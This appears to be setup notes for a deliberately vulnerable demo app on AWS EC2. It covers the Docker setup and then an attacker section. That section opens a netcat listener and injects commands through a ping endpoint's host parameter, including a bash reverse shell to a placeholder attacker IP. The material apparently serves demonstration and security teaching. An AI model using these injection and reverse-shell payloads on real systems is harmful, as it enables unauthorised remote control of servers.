# Setup EC2
- Connect to EC2
```
ssh -i <pem-key>.pem ec2-user@<ec2-public-ip>
```

- Setup Docker
```
sudo amazon-linux-extras install docker -y
sudo service docker start
sudo usermod -aG docker ec2-user  # To run Docker without sudo

exit                              # To renew group permissions
ssh -i <pem-key>.pem ec2-user@<ec2-public-ip>
```

- (Optional) Test docker
```
docker run hello-world
```

- Start application
```
git clone https://github.com/agusalberca/ssrf-demo-app.git
cd /home/ec2-user/ssrf-demo-app
docker build -t ssrf-demo-app .
docker run -d -p 3000:3000 ssrf-demo-app

```

# Atacker machine
## Setup
- Run listener: `nc -lvp 4444`

## Exploit
Post to endpoint `curl 'https://<victim-id>/ping?host='`
    - `8.8.8.8; ls -la`
    - `8.8.8.8; bash -i >& /dev/tcp/attacker-ip/4444 0>&1`
    -